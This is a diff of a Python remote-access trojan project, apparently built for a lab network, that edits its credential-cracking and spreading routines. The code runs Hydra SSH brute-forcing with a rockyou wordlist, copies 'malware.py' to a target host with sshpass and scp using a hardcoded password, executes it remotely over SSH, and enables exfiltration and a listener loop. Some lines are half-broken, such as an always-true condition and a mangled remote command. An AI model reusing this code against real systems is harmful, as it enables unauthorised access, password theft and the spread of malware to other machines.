@@ -47,14 +47,14 @@ class SERVER:
         fileList = os.listdir(".")
         for file in fileList:
             if file.endswith(".pc"):
-                print ("Checking File: " + file)
+                print ("File: " + file)
                 with open(file) as thisFile:
                     for line in thisFile:
                         if 'password' in line or 'Hydra attempted:yes' in line:
                             print('password or hydra attempt present')
                             runHydra = False
                         else:
-                            #print('no password or hydra attempt')
+                            print('no password or hydra attempt')
                             runHydra=True
                             break
 
@@ -62,15 +62,9 @@ class SERVER:
                     if runHydra == True:
                         print('run hydra on ' + str(thisFile.name))
                         thisFile.write('\n'+ "Hydra attempted:yes")
-                        hResult = subprocess.run(["hydra", "-l", "user1", "-P", '/media/sf_VM_Storage/rat/RAT/rockyou_short.txt', "ssh://192.168.56.115"],capture_output=True)
-                        print(hResult.stdout)
-                        #parse hydra data and write password to file
-                        passIndex = str(hResult.stdout).find("password:") + 10 # get index of location of 'password: ' in results
-                        password = str(hResult.stdout)[passIndex:]
-                        endIndex = password.find("1 of 1") #find end of password
-                        password = password[0:endIndex-2]
-                        print("password is : " + password)
-                        thisFile.write('\n'+ 'password: ' + password)
+                        #hResult = subprocess.run(["hydra", "-l", "user1", "-P", '/media/sf_VM_Storage/rat/RAT/rockyou_short.txt', "ssh://192.168.56.114"],capture_output=True)
+                        #print(hResult.stdout)
+                        #TODO parse hydra data and write password to file
 
                     else:
                         print('do NOT run hydra on ' + str(thisFile.name))    
@@ -83,22 +77,21 @@ class SERVER:
                 with open(file) as thisFile:
                     for line in thisFile:
                         thisIP = '192.168.56.115'
-                        thisPass = 'rockyou!'
-                        if 'password' in line:
-
+                        if 'password' in line or 1 == 1: # TODO always true
                             print("spread attempt")
                             #addSSHResult = subprocess.run(["ssh-keyscan", "-H", thisIP, ">>", "~/.ssh/known_hosts" ],capture_output=True)
                             #print(addSSHResult.stdout)
                             #print(addSSHResult.stderr)
 
-                            transResult = subprocess.run(["sshpass", "-p", thisPass, "scp", "./malware-pc3.py", "user1@192.168.56.115:/home/user1/Desktop/"],capture_output=True)
-                            #print(transResult.stdout)
-                            #print(transResult.stderr)
+                            transResult = subprocess.run(["sshpass", "-p", "rockyou!", "scp", "./malware.py", "user1@192.168.56.115:/home/user1/Desktop/"],capture_output=True)
+                            print(transResult.stdout)
+                            print(transResult.stderr)
 
-                            malExecResult = subprocess.run(["sshpass", "-p", thisPass, "ssh", "user1@192.168.56.115", "/home/user1/Desktop/malware-pc3.py"],capture_output=True)
+                            malExecResult = subprocess.run(["sshpass", "-p", "rockyou!", "ssh", "user1@192.168.56.115", "'bash", "-s", "<", "/home/user1/Desktop/malware.py'"],capture_output=True)
                             print(malExecResult.stdout)
                             print(malExecResult.stderr)
-
+                        else:
+                            print("no password, no spread")
  
     
     # setting up function for webcam accessability for later use
@@ -218,13 +211,13 @@ class SERVER:
                     return
 
 # setting host port and ip to construct with the server class
-rat = SERVER('0.0.0.0', 7878)
+rat = SERVER('0.0.0.0', 5656)
 
 
 
 if __name__ == '__main__':
-    #rat.connection()
-    #rat.CompromisedExfil()
-    rat.RunHydra()
-    rat.malSpread()
-    #rat.mainloop()
+    rat.connection()
+    rat.CompromisedExfil()
+    #rat.RunHydra()
+    #malSpread()
+    rat.mainloop()
